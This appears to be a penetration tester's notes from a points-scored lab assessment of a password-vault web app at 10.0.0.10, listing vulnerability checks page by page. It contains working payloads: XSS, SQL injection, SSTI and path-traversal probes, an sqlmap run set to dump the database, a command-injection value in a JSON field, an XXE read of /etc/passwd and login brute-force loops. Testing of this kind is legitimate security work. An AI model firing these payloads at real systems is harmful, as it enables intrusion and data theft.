# Vulnerabilities to Test Per Page

## Homepage Vulnerabilities to Test
- **Stored XSS in registration username field**: Register with `<script>alert('XSS')</script>`, check if executed on login page.
- **Broken Authentication**: Test weak passwords, rate limiting on login/register.
- **Information Disclosure**: Check if error messages leak sensitive info.

## Vault Page Vulnerabilities to Test
- **IDOR in edit/delete**: Access other users' items via URL manipulation (e.g., /vault/edit/other_id).
- **Stored XSS in vault item display**: Add item with XSS in title/username, check if executed when viewing.
- **SQLi in add/edit**: Payload in JSON fields like `{"vaulttitle":"' OR 1=1 --"}`.

## Account Page Vulnerabilities to Test
- **CSRF in password update**: Use HTML form to change password without user interaction.
- **Broken Access Control**: Test if can update other users' accounts (unlikely, as uses session).
- **Weak Password Policy**: Update to weak password, check if allowed.

## API Page Vulnerabilities to Test
- **IDOR in API endpoints**: Use token from user A to access user B's data via GET /api/vault/:token or POST /api/vault/:id.
- **Broken Authentication**: Test token brute force, expiration, or if tokens are guessable.
- **Input Validation**: Send malformed JSON or large inputs to API endpoints.

Use curl for API, browser for web vulns. Document any confirmed findings with POC.


1. Learn it's Node.js → Try SSTI: {{7*7}}
2. See /usr/app/ → Try LFI: ../../../../usr/app/package.json
3. Find dependencies → Check for vulnerable versions


sqlmap -u "http://10.0.0.10/vault/add" \
  --data='{"vaulttitle":"*","vaultusername":"*","vaultpassword":"*"}' \
  --headers="Content-Type: application/json" \
  --cookie="connect.sid=s%3AdR3xsr6cihqDBYCreaF3wSfhTeWKqruZ.AWPS0%2B%2BPoZTxR788rPPZc2ucZ5400oYsPYME9JHFOEA" \
  --batch --level=5 --risk=3 \
  --dump --delay=1




Quick verification commands:

Security Headers:

curl -I http://10.0.0.10
Check for missing: X-Frame-Options, X-Content-Type-Options, CSP, HSTS.

Weak Passwords: Register with password "1" via curl/JS, confirm accepted.

Rate Limiting:

for i in {1..60}; do curl -X POST http://10.0.0.10/login -H "Content-Type: application/json" -d '{"username":"test","password":"wrong"}'; done
Check if >50 requests succeed.

HTTPS: Confirm URL is http://, not https:// (cleartext submission).

All confirmed as medium/low weaknesses, no points. If new findings, report. Otherwise, pentest complete at 75 points.

============================================================

Test weak password acceptance.

curl -X POST http://10.0.0.10/register \
  -H "Content-Type: application/json" \
  -d '{"username":"weakpassuser123","password":"1"}'

============================================================

That's 50 points. You need 25 more points from the list. Options:

Stored XSS - Already tested negative
Command Injection - Not tested
Template Injection - Already tested negative (SSTI)
XXE - Not tested
BOLA - Overlaps with IDOR
BFLA - Not fully tested
SSRF - Already tested negative
Broken Access Control - Overlaps with IDOR
Broken Authentication - Not tested
Open Redirect - Already tested negative
Should I test the untested ones (Command Injection, XXE, Broken Authentication, BFLA) to find a third 25-point vulnerability?

============================================================    

1. Command Injection
Test in vault endpoints (title, username fields):

curl -X POST http://10.0.0.10/vault/add \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=YOUR_SESSION" \
  -d '{"title":"test; id;","username":"test","password":"test","url":"http://test.com"}'
Look for command output in response (uid=, gid=, etc.).

2. XXE (XML External Entity)
Test if app accepts XML input (unlikely with JSON API, but check):

curl -X POST http://10.0.0.10/vault/add \
  -H "Content-Type: application/xml" \
  -H "Cookie: connect.sid=YOUR_SESSION" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
Look for file contents in response.

3. Broken Authentication
Test session fixation - capture pre-login cookie, login, verify if old cookie still works:

# Capture cookie before login
curl -c cookies.txt http://10.0.0.10/login
 
# Login with credentials
curl -b cookies.txt -X POST http://10.0.0.10/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}'
 
# Check if old cookie grants access to /vault
curl -b cookies.txt http://10.0.0.10/vault
If old cookie works after login = Session Fixation vulnerability.

4. BFLA (Broken Function Level Authorization)
Test if unauthenticated user can access admin/protected functions:

curl http://10.0.0.10/admin
curl http://10.0.0.10/api/admin
curl http://10.0.0.10/api/users
